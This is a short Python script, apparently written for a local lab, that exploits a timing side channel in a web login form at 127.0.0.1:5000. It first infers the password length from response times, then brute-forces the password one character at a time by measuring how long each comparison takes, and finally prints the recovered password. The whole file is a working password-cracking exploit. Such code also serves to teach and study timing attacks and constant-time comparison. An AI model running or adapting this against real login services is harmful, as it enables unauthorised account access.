#!/usr/bin/env python3
"""
Exploit the timing sidechannel in a
stupid login website.
"""
import random
import requests
import string
import sys
import time


# check time with fudge factor
def longerThan(t1, t2, fudge=0.01):
    """
    check time length with a fudge factor
    """
    if abs(t1 - t2) < fudge:
        return False
    return True


# determine overall length to enable detailed checks
guess = ""
rtime = 0.01
for l in range(0,255):
    try:
        start = time.perf_counter()
        r = requests.post('http://127.0.0.1:5000/login',
                          data={'password': 'a'*l})
    except requests.exceptions.ConnectionError:
        print("no target server running ...")
        sys.exit(2)
    if 200 != r.status_code:
        print("request failed")
        sys.exit(1)
    end = time.perf_counter()
    # first "non-zero" time plateau -> hint as password length
    difftime = end - start
    if difftime > rtime:
        rtime = end - start
        guess = 'a'*l
        break

print("guessed length of the password: " + str(len(guess)))


clist = list(guess)  # make a list of password characters
for i in range(0,len(clist)):
    for c in string.ascii_lowercase:
        clist[i] = c
        guess = ''
        for p in clist:
            guess += p
        try:
            start = time.perf_counter()
            r = requests.post('http://127.0.0.1:5000/login',
                              data={'password': guess})
        except requests.exceptions.ConnectionError:
            print("no target server running ...")
            sys.exit(2)
        if 200 != r.status_code:
            print("request failed")
            sys.exit(1)
        end = time.perf_counter()
        # as soon as comparision takes longer
        # a new character has been found
        difftime = end - start
        if longerThan(difftime,rtime,0.03):
            rtime = difftime
            print("cracked " + str(i+1) + "/" + str(len(clist)))
            break  # break the loop to check next character

# assemble password to print
password = ''
for c in clist:
    password += c
print('password: "' + password + '"')
